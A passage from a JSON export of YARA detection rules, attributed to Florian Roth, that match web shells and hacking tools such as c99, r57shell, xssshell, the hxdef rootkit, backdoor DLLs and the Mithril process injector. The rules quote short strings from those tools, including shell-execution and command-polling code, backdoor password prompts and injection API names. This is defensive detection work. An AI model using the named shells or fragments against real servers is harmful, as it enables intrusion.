c99.php","minimum_yara":"1.7","name":"Webshell_FSO_s_c99_RID2D94","reference":"-","required_modules":[],"rule_hash":"1f9c9a196afadc4df5a17b07f19e677d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_dbgntboot_RID2C66 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dbgntboot.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp\" \n      $s3 = \"sth junk the M$ Wind0wZ retur\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:47:31","description":"Webshells Auto-generated - file dbgntboot.dll","minimum_yara":"1.7","name":"HKTL_dbgntboot_RID2C66","reference":"-","required_modules":[],"rule_hash":"772f08355c18840712fc1d844ce34458","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_shell_RID2E05 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz\" \n      $s11 = \"1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:56:41","description":"Webshells Auto-generated - file shell.php","minimum_yara":"1.7","name":"Webshell_PHP_shell_RID2E05","reference":"-","required_modules":[],"rule_hash":"536b736dfadf97fca2f3a273de76ed36","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_hxdef100_RID2B43 : DEMO HKTL T1050 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1050, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RtlAnsiStringToUnicodeString\" \n      $s8 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\\" \n      $s9 = \"\\\\\\\\.\\\\mailslot\\\\hxdef-rk100sABCDEFGH\" \n   condition: \n      all of them\n}","date":"2014-04-07 08:59:01","description":"Webshells Auto-generated - file hxdef100.exe","minimum_yara":"1.7","name":"HKTL_hxdef100_RID2B43","reference":"-","required_modules":[],"rule_hash":"fd32e9af3fd138858084c6747dd6abce","score":75,"tags":["T1100","DEMO","WEBSHELL","T1050","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_rdrbs100_RID2B51 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file rdrbs100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Server address must be IP in A.B.C.D format.\" \n      $s4 = \" mapped ports in the list. Currently \" \n   condition: \n      all of them\n}","date":"2014-04-07 09:01:21","description":"Webshells Auto-generated - file rdrbs100.exe","minimum_yara":"1.7","name":"HKTL_rdrbs100_RID2B51","reference":"-","required_modules":[],"rule_hash":"0a28fb077018400e4fe9bbecfde38da1","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_hxdef100_2_RID2BD4 : DEMO HKTL T1050 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hxdef100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1050, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\\\\\.\\\\mailslot\\\\hxdef-rkc000\" \n      $s2 = \"Shared Components\\\\On Access Scanner\\\\BehaviourBlo\" \n      $s6 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:23:11","description":"Webshells Auto-generated - file hxdef100.exe","minimum_yara":"1.7","name":"HKTL_hxdef100_2_RID2BD4","reference":"-","required_modules":[],"rule_hash":"9849cde8b19e0c04c6e5aed33f07f47e","score":75,"tags":["T1100","DEMO","WEBSHELL","T1050","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_webadmin_RID2DED : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file webadmin.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:52:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\\\\\"editfilename\\\\\\\" type=\\\\\\\"text\\\\\\\" class=\\\\\\\"style1\\\\\\\" value='\\\".$this->inpu\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:52:41","description":"Webshells Auto-generated - file webadmin.php","minimum_yara":"1.7","name":"Webshell_webadmin_RID2DED","reference":"-","required_modules":[],"rule_hash":"5a4acc5c646179485c605f11e3e206d0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_commands_RID2F3B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file commands.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"If CheckRecord(\\\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \\\" & VictimID\" \n      $s2 = \"proxyArr = Array (\\\"HTTP_X_FORWARDED_FOR\\\",\\\"HTTP_VIA\\\",\\\"HTTP_CACHE_CONTROL\\\",\\\"HTTP_F\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:48:21","description":"Webshells Auto-generated - file commands.asp","minimum_yara":"1.7","name":"Webshell_ASP_commands_RID2F3B","reference":"-","required_modules":[],"rule_hash":"c45c81593244f6ad9ad99b25c086b1e1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_hkdoordll_RID2C66 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hkdoordll.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:47:31","description":"Webshells Auto-generated - file hkdoordll.dll","minimum_yara":"1.7","name":"HKTL_hkdoordll_RID2C66","reference":"-","required_modules":[],"rule_hash":"f1e11459c8270b51a47f07b13e80b1ed","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Mithril_tool_RID2D99 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Mithril.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"OpenProcess error!\" \n      $s1 = \"WriteProcessMemory error!\" \n      $s4 = \"GetProcAddress error!\" \n      $s5 = \"HHt`HHt\\\\\" \n      $s6 = \"Cmaudi0\" \n      $s7 = \"CreateRemoteThread error!\" \n      $s8 = \"Kernel32\" \n      $s9 = \"VirtualAllocEx error!\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:38:41","description":"Webshells Auto-generated - file Mithril.exe","minimum_yara":"1.7","name":"HKTL_Mithril_tool_RID2D99","reference":"-","required_modules":[],"rule_hash":"3618525f638a57dfe94a22ba3a321b51","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Release_dllTest_RID2E9F : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \";;;Y;`;d;h;l;p;t;x;|;\" \n      $s1 = \"0 0&00060K0R0X0f0l0q0w0\" \n      $s2 = \": :$:(:,:0:4:8:D:`=d=\" \n      $s3 = \"4@5P5T5\\\\5T7\\\\7d7l7t7|7\" \n      $s4 = \"1,121>1C1K1Q1X1^1e1k1s1y1\" \n      $s5 = \"9 9$9(9,9P9X9\\\\9`9d9h9l9p9t9x9|9\" \n      $s6 = \"0)0O0\\\\0a0o0\\\"1E1P1q1\" \n      $s7 = \"<.<I<d<h<l<p<t<x<|<\" \n      $s8 = \"3&31383>3F3Q3X3`3f3w3|3\" \n      $s9 = \"8@;D;H;L;P;T;X;\\\\;a;9=W=z=\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:22:21","description":"Webshells Auto-generated - file dllTest.dll","minimum_yara":"1.7","name":"HKTL_Release_dllTest_RID2E9F","reference":"-","required_modules":[],"rule_hash":"0265bdb7f5d5fca45ee68c3a81f32cf8","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_2_RID2E2D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<br>\\\".ws(2).\\\"HDD Free : <b>\\\".view_size($free).\\\"</b> HDD Total : <b>\\\".view_\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:03:21","description":"Webshells Auto-generated - file r57shell.php","minimum_yara":"1.7","name":"Webshell_r57shell_2_RID2E2D","reference":"-","required_modules":[],"rule_hash":"2c04cc037142c3b6b828bfcd6e13b46c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Mithril_v1_45_dllTest_RID3085 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"syspath\" \n      $s4 = \"\\\\Mithril\" \n      $s5 = \"--list the services in the computer\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:43:21","description":"Webshells Auto-generated - file dllTest.dll","minimum_yara":"1.7","name":"HKTL_Mithril_v1_45_dllTest_RID3085","reference":"-","required_modules":[],"rule_hash":"8c223b3b37630d22ce3d1f9526bb7b60","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_dbgiis6cli_RID2C83 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dbgiis6cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" \n      $s5 = \"###command:(NO more than 100 bytes!)\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:52:21","description":"Webshells Auto-generated - file dbgiis6cli.exe","minimum_yara":"1.7","name":"HKTL_dbgiis6cli_RID2C83","reference":"-","required_modules":[],"rule_hash":"f6e468162f8eaf5e24d1d27d93790c87","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_remview_2003_04_22_RID304F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file remview_2003_04_22.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:34:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"<b>\\\".mm(\\\"Eval PHP code\\\").\\\"</b> (\\\".mm(\\\"don't type\\\").\\\" \\\\\\\"&lt;?\\\\\\\"\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:34:21","description":"Webshells Auto-generated - file remview_2003_04_22.php","minimum_yara":"1.7","name":"Webshell_remview_2003_04_22_RID304F","reference":"-","required_modules":[],"rule_hash":"8a1ac7b751dea2905126d7f186276097","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_test_RID2E7F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file test.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$yazi = \\\"test\\\" . \\\"\\\\r\\\\n\\\";\" \n      $s2 = \"fwrite ($fp, \\\"$yazi\\\");\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:17:01","description":"Webshells Auto-generated - file test.php","minimum_yara":"1.7","name":"Webshell_FSO_s_test_RID2E7F","reference":"-","required_modules":[],"rule_hash":"de5b4a2d0574a41c3764887085ed1c27","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Debug_cress_RID2D09 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file cress.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Mithril \" \n      $s4 = \"Mithril.exe\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:14:41","description":"Webshells Auto-generated - file cress.exe","minimum_yara":"1.7","name":"HKTL_Debug_cress_RID2D09","reference":"-","required_modules":[],"rule_hash":"853ad7a1ad2ffc0ce705811ce06df956","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_RhV_webshell_RID2F6B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file webshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RhViRYOzz\" \n      $s1 = \"d\\\\O!jWW\" \n      $s2 = \"bc!jWW\" \n      $s3 = \"0W[&{l\" \n      $s4 = \"[INhQ@\\\\\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:56:21","description":"Webshells Auto-generated - file webshell.php","minimum_yara":"1.7","name":"Webshell_RhV_webshell_RID2F6B","reference":"-","required_modules":[],"rule_hash":"950f8e671a7a88e9ee3e1c950b078542","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_thelast_index3_RID3045 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file index3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$err = \\\"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\\\\\"Your Name\\\\\\\" field is r\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:32:41","description":"Webshells Auto-generated - file index3.php","minimum_yara":"1.7","name":"Webshell_thelast_index3_RID3045","reference":"-","required_modules":[],"rule_hash":"33ddfb4d11bc86e2d85a35a3b24face6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_adjustcr_RID2C03 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file adjustcr.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:31:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$Info: This file is packed with the UPX executable packer $\" \n      $s2 = \"$License: NRV for UPX is distributed under special license $\" \n      $s6 = \"AdjustCR Carr\" \n      $s7 = \"ION\\\\System\\\\FloatingPo\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:31:01","description":"Webshells Auto-generated - file adjustcr.exe","minimum_yara":"1.7","name":"HKTL_adjustcr_RID2C03","reference":"-","required_modules":[],"rule_hash":"a41a32d8e9d2779db71000386598b4fb","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_AppPack_2005_RID309F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:47:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"\\\" onclick=\\\"this.form.sqlStr.value='e:\\\\hytop.mdb\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:47:41","description":"Webshells Auto-generated - file 2005.asp","minimum_yara":"1.7","name":"Webshell_HYTop_AppPack_2005_RID309F","reference":"-","required_modules":[],"rule_hash":"f5cb6e080bfe294a10c50d62f6dfd270","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_xssshell_RID2E1C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file xssshell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:00:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if( !getRequest(COMMANDS_URL + \\\"?v=\\\" + VICTIM + \\\"&r=\\\" + generateID(), \\\"pushComma\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:00:31","description":"Webshells Auto-generated - file xssshell.asp","minimum_yara":"1.7","name":"Webshell_xssshell_RID2E1C","reference":"-","required_modules":[],"rule_hash":"52bbd6e74a53e42dd4a568776b435574","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FeliksPack3___PHP_Shells_usr_RID353E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file usr.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 16:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor\" \n   condition: \n      all of them\n}","date":"2014-04-07 16:04:51","description":"Webshells Auto-generated - file usr.php","minimum_yara":"1.7","name":"Webshell_FeliksPack3___PHP_Shells_usr_RID353E","reference":"-","required_modules":[],"rule_hash":"f82506e929bf3f26e278ccb8d9c5bf57","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_phpinj_RID2F48 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpinj.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:50:31","description":"Webshells Auto-generated - file phpinj.php","minimum_yara":"1.7","name":"Webshell_FSO_s_phpinj_RID2F48","reference":"-","required_modules":[],"rule_hash":"1ed6c1f1129e7488a930f20d2cf7ab3d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_xssshell_db_RID2F41 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file db.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"'// By Ferruh Mavituna | http://ferruh.mavituna.com\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:49:21","description":"Webshells Auto-generated - file db.asp","minimum_yara":"1.7","name":"Webshell_xssshell_db_RID2F41","reference":"-","required_modules":[],"rule_hash":"a31bfded7441af0c8118cd61a91290cc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_sh_RID2CC8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file sh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"@$SERVER_NAME \\\".exec(\\\"pwd\\\")\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:03:51","description":"Webshells Auto-generated - file sh.php","minimum_yara":"1.7","name":"Webshell_PHP_sh_RID2CC8","reference":"-","required_modules":[],"rule_hash":"284e497c974e16baf96aa66c5e1fbbd9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_xssshell_default_RID3160 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file default.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"If ProxyData <> \\\"\\\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \\\"<br />\\\")\" \n   condition: \n      all of them\n}","date":"2014-04-07 13:19:51","description":"Webshells Auto-generated - file default.asp","minimum_yara":"1.7","name":"Webshell_xssshell_default_RID3160","reference":"-","required_modules":[],"rule_hash":"5a56cf3a17490c6aada23bb9673648cc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_EditServer_2_RID2D31 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file EditServer.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@HOTMAIL.COM\" \n      $s1 = \"Press Any Ke\" \n      $s3 = \"glish MenuZ\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:21:21","description":"Webshells Auto-generated - file EditServer.exe","minimum_yara":"1.7","name":"HKTL_EditServer_2_RID2D31","reference":"-","required_modules":[],"rule_hash":"d7f376503813ec00f7098ee317b40a68","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_by064cli_RID2B50 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file by064cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"packet dropped,redirecting\" \n      $s9 = \"input the password(the default one is 'by')\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:01:11","description":"Webshells Auto-generated - file by064cli.exe","minimum_yara":"1.7","name":"HKTL_by064cli_RID2B50","reference":"-","required_modules":[],"rule_hash":"e85d80f72cc8a21976fc4128e4de10c8","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Mithril_dllTest_RID2EB7 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"please enter the password:\" \n      $s3 = \"\\\\dllTest.pdb\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:26:21","description":"Webshells Auto-generated - file dllTest.dll","minimum_yara":"1.7","name":"HKTL_Mithril_dllTest_RID2EB7","reference":"-","required_modules":[],"rule_hash":"ff145d80a1f1668c37357f4951a00ae5","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_peek_a_boo_RID2CA7 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file peek-a-boo.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"__vbaHresultCheckObj\" \n      $s1 = \"\\\\VB\\\\VB5.OLB\" \n      $s2 = \"capGetDriverDescriptionA\" \n      $s3 = 